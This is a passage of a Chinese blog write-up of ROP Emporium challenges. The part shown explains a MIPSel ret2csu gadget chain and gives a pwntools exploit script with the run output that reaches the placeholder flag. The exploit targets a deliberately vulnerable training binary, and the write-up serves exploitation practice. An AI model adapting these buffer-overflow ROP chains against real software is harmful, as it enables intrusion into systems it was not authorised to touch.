class="line">.text:004009D4 20 00 B1 8F                   lw      $s1, 0x1C+var_s4($sp)</span><br><span class="line">.text:004009D8 1C 00 B0 8F                   lw      $s0, 0x1C+var_s0($sp)</span><br><span class="line">.text:004009DC 08 00 E0 03                   jr      $ra</span><br><span class="line">.text:004009E0 38 00 BD 27                   addiu   $sp, 0x38</span><br></pre></td></tr></table></figure>
<p>可以利用pop链首先将pwnme的返回地址覆盖为<code>004009C0</code>，运行<span class="math inline">\(gadget_1\)</span>(范围为0x04009C0-004009E4)，将栈上的数据分别复制到 <em>ra, s5, s4, s3, s2, s1, s0</em> 寄存器中，其中 <em>ra</em> 寄存器值复制为<code>004009A0</code>，使<span class="math inline">\(gadget_1\)</span>运行完后跳转到<span class="math inline">\(gadget_2\)</span>(范围为0x04009A0-004009C0)，由于 <em>s5, s4, s3</em> 将会分别复制给 <em>a2, a1, a0</em> 寄存器，因此其值分别复制为三个参数的值，对于 <em>s2, s1, s0</em> 的赋值，需要结合<span class="math inline">\(gadget_2\)</span>来看，<em>s1</em>应当比 <em>s2</em> 的值小1，因为 <span class="math inline">\(gadget_2\)</span> 中将s1值自增1，<span class="math inline">\(gadget_2\)</span> 中会跳转到 <em>t9</em> 寄存器所指向的地址，而 <em>t9</em> 寄存器值由 <em>s0</em> 控制写入，为避免跳转到 <em>t9</em> 处对 <em>a2, a1, a0</em> 产生影响，因此 <em>t9</em> 寄存器所指向的地址的代码应当简单，查看可利用的gadget：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:004009E4 08 00 E0 03                   jr      $ra</span><br><span class="line">.text:004009E8 00 00 00 00                   nop</span><br></pre></td></tr></table></figure>
<p>发现<code>004009E4</code>处指令较为简单，直接返回了调用函数，且<code>00411030</code>处值为<code>004009E4</code>，可以将 <em>s0</em> 复制为<code>00411030</code>，则 <em>t9</em> 值将会加载为<code>004009E4</code>，当运行<code>jalr $t9</code>指令后，不会对 <span class="math inline">\(gadget_2\)</span> 产生影响。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.got:00411030 E4 09 40 00                   __libc_csu_fini_ptr:.word __libc_csu_fini</span><br></pre></td></tr></table></figure>
<p>当 <span class="math inline">\(gadget_2\)</span> 运行完毕后，会继续执行 <span class="math inline">\(gadget_1\)</span> 处的代码，此时只需要将 <em>ra</em> 寄存器值复制为<code>ret2win</code>地址即可。</p>
<h4 id="编写exp-5">编写exp</h4>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ast <span class="keyword">import</span> arg</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;mips&#x27;</span></span><br><span class="line">context.endian = <span class="string">&#x27;little&#x27;</span></span><br><span class="line">context.bits = <span class="number">32</span></span><br><span class="line"></span><br><span class="line">p = process([<span class="string">&#x27;qemu-mipsel&#x27;</span>, <span class="string">&#x27;-L&#x27;</span>, <span class="string">&#x27;/usr/mipsel-linux-gnu/&#x27;</span>, <span class="string">&#x27;./ret2csu_mipsel&#x27;</span>])</span><br><span class="line"></span><br><span class="line">ret2win = <span class="number">0x00400A60</span></span><br><span class="line">nop = <span class="number">0x00411030</span></span><br><span class="line">lw_ra_jr = <span class="number">0x004009C0</span></span><br><span class="line">mov_arg = <span class="number">0x004009A0</span></span><br><span class="line"></span><br><span class="line">arg1 = <span class="number">0xDEADBEEF</span></span><br><span class="line">arg2 = <span class="number">0x0CAFEBABE</span></span><br><span class="line">arg3 = <span class="number">0x0D00DF00D</span></span><br><span class="line"></span><br><span class="line">payload  = <span class="string">b&quot;A&quot;</span> * (<span class="number">0x24</span>)</span><br><span class="line">payload += p32(lw_ra_jr)</span><br><span class="line"></span><br><span class="line">payload += <span class="string">b&quot;B&quot;</span> * <span class="number">0x1C</span></span><br><span class="line">payload += p32(nop)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(<span class="number">1</span>)</span><br><span class="line">payload += p32(arg1)</span><br><span class="line">payload += p32(arg2)</span><br><span class="line">payload += p32(arg3)</span><br><span class="line">payload += p32(mov_arg)</span><br><span class="line"></span><br><span class="line">payload += <span class="string">b&quot;C&quot;</span> * <span class="number">0x1C</span></span><br><span class="line">payload += <span class="string">b&quot;CCCC&quot;</span> * <span class="number">6</span></span><br><span class="line">payload += p32(ret2win)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h4 id="运行结果-5">运行结果</h4>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ python exp.py </span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;/usr/bin/qemu-mipsel&#x27;</span>: pid 4066</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">ret2csu by ROP Emporium</span><br><span class="line">MIPS</span><br><span class="line"></span><br><span class="line">Check out https://ropemporium.com/challenge/ret2csu.html <span class="keyword">for</span> information on how to solve this challenge.</span><br><span class="line"></span><br><span class="line">&gt; Thank you!</span><br><span class="line">ROPE&#123;a_placeholder_32byte_flag!&#125;</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br></pre></td></tr></table></figure>
<h2 id="参考">参考</h2>
<ol type="1">
<li>[<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-272054.htm">原创]writeup-ROP Emporium fluff-二进制漏洞-看雪论坛-安全社区|安全招聘|bbs.pediy.com</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/AcSuccess/article/details/104448463">中级ROP之ret2csu_西杭的博客-CSDN博客</a></li>
</ol>

    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/pwn/" rel="tag"># pwn</a>
              <a href="/tags/rop/" rel="tag"># rop</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2022/09/27/rop-emporium/" rel="prev" title="rop emporium">
      <i class="fa fa-chevron-left"></i> rop emporium
    </a></div>
      <div class="post-nav-item"></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#fluff"><span class="nav-number">1.</span> <span class="nav-text">fluff</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#x86%E5%92%8Cx64"><span class="nav-number">1.1.</span> <span class="nav-text">x86和x64</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#armv5"><span class="nav-number">1.2.</span> <span class="nav-text">armv5</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-number">1.2.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BC%96%E5%86%99exp"><span class="nav-number">1.2.2.</span> <span class="nav-text">编写exp</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%90%E8%A1%8C%E7%BB%93%E6%9E%9C"><span class="nav-number">1.2.3.</span> <span class="nav-text">运行结果</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mipsel"><span class="nav-number">1.3.</span> <span class="nav-text">mipsel</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%86%E6%9E%90-1"><span class="nav-number">1.3.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BC%96%E5%86%99exp-1"><span class="nav-number">1.3.2.</span> <span class="nav-text">编写exp</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%90%E8%A1%8C%E7%BB%93%E6%9E%9C-1"><span class="nav-number">1.3.3.</span> <span class="nav-text">运行结果</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F%E8%A7%A3"><span class="nav-number">1.3.4.</span> <span class="nav-text">非预期解</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pivot"><span class="nav-number">2.</span> <span class="nav-text">pivot</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#x86%E5%92%8Cx64-1"><span class="nav-number">2.1.</span> <span class="nav-text">x86和x64</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%86%E6%9E%90-2"><span class="nav-number">2.1.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BC%96%E5%86%99exp-2"><span class="nav-number">2.1.2.</span> <span class="nav-text">编写exp</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%90%E8%A1%8C%E7%BB%93%E6%9E%9C-2"><span class="nav-number">2.1.3.</span> <span class="nav-text">运行结果</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#armv5-1"><span class="nav-number">2.2.</span> <span class="nav-text">armv5</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mipsel-1"><span class="nav-number">2.3.</span> <span class="nav-text">mipsel</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2csu"><span class="nav-number">3.</span> <span class="nav-text">ret2csu</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#x64"><span class="nav-number">3.1.</span> <span class="nav-text">x64</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%86%E6%9E%90-3"><span class="nav-number">3.1.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BC%96%E5%86%99exp-3"><span class="nav-number">3.1.2.</span> <span class="nav-text">编写exp</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%90%E8%A1%8C%E7%BB%93%E6%9E%9C-3"><span class="nav-number">3.1.3.</span> <span class="nav-text">运行结果</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#armv5-2"><span class="nav-number">3.2.</span> <span class="nav-text">armv5</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%86%E6%9E%90-4"><span class="nav-number">3.2.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BC%96%E5%86%99exp-4"><span class="nav-number">3.2.2.</span> <span class="nav-text">编写exp</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%90%E8%A1%8C%E7%BB%93%E6%9E%9C-4"><span class="nav-number">3.2.3.</span> <span class="nav-text">运行结果</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#armv5-hf"><span class="nav-number">3.2.4.</span> <span class="nav-text">armv5-hf</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mipsel-2"><span class="nav-number">3.3.</span> <span class="nav-text">mipsel</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%86%E6%9E%90-5"><span class="nav-number">3.3.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BC%96%E5%86%99exp-5"><span class="nav-number">3.3.2.</span> <span class="nav-text">编写exp</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%90%E8%A1%8C%E7%BB%93%E6%9E%9C-5"><span class="nav-number">3.3.3.</span> <span class="nav-text">运行结果</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">4.</span> <span class="nav-text">参考</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="lylanfree"
      src="/images/avatar.png">
  <p class="site-author-name" itemprop="name">lylanfree</p>
  <div class="site-description" itemprop="description">持续学习的程序员</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">30</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">8</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">19</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">lylanfree</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
      <span class="post-meta-item-text">Symbols count total: </span>
    <span title="Symbols count total">222k</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span class="post-meta-item-text">Reading time total &asymp;</span>
    <span title="Reading time total">3:22</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  
      

<script>
  if (typeof MathJax === 'undefined') {
    window.MathJax = {
      loader: {
        source: {
          '[tex]/amsCd': '[tex]/amscd',
          '[tex]/AMScd': '[tex]/amscd'
        }
      },
      tex: {
        inlineMath: {'[+]': [['$', '$']]},
        tags: 'ams'
      },
      options: {
        renderActions: {
          findScript: [10, doc => {
            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
              const display = !!node.type.match(/; *mode=display/);
              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
              const text = document.createTextNode('');
              node.parentNode.replaceChild(text, node);
              math.start = {node: text, delim: '', n: 0};
              math.end = {node: text, delim: '', n: 0};
              doc.math.push(math);
            });
          }, '', false],
          insertedScript: [200, () => {
            document.querySelectorAll('mjx-container').forEach(node => {
              let target = node.parentNode;
              if (target.nodeName.toLowerCase() === 'li') {
                target.parentNode.classList.add('has-jax');
              }
            });
          }, '', false]
        }
      }
    };
    (function () {
      var script = document.createElement('script');
      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
      script.defer = true;
      document.head.appendChild(script);
    })();
  } else {
    MathJax.startup.document.state(0);
    MathJax.texReset();
    MathJax.typeset();
  }
</script>

    

  


  
  <style>
    .copy-btn {
      display: inline-block;
      padding: 6px 12px;
      font-size: 13px;
      font-weight: 700;
      line-height: 20px;
      color: #4D4D4C;
      white-space: nowrap;
      vertical-align: middle;
      cursor: pointer;
      background-color: #F7F7F7;
      background-image: linear-gradient(#F7F7F7, #F7F7F7);
      border: 1px solid #d5d5d5;
      border-radius: 3px;
      user-select: none;
      outline: 0;
    }

    .highlight-wrap .copy-btn {
      transition: opacity .3s ease-in-out;
      opacity: 0;
      padding: 2px 6px;
      position: absolute;
      right: 4px;
      top: 8px;
    }

    .highlight-wrap:hover .copy-btn,
    .highlight-wrap .copy-btn:focus {
      opacity: 1
    }

    .highlight-wrap {
      position: relative;
    }
  </style>

  <script>
    $('.highlight').each(function (i, e) {
      var $wrap = $('<div>').addClass('highlight-wrap')
      $(e).after($wrap)
      $wrap.append($('<button>').addClass('copy-btn').append('post.copy_button').on('click', function (e) {
        var code = $(this).parent().find('.code').find('.line').map(function (i, e) {
          return $(e).text()
        }).toArray().join('\n')
        var ta = document.createElement('textarea')
        document.body.appendChild(ta)
        ta.style.position = 'absolute'
        ta.style.top = '0px'
        ta.style.left = '0px'
        ta.value = code
        ta.select()
        ta.focus()
        var result = document.execCommand('copy')
        document.body.removeChild(ta)
        
          if(result)$(this).text('post.copy_success')
          else $(this).text('post.copy_failure')
        
        $(this).blur()
      })).on('mouseleave', function (e) {
        var $b = $(this).find('.copy-btn')
        setTimeout(function () {
          $b.text('post.copy_button')
        }, 300)
      }).append(e)
    })
  </script>


</body>
</html>
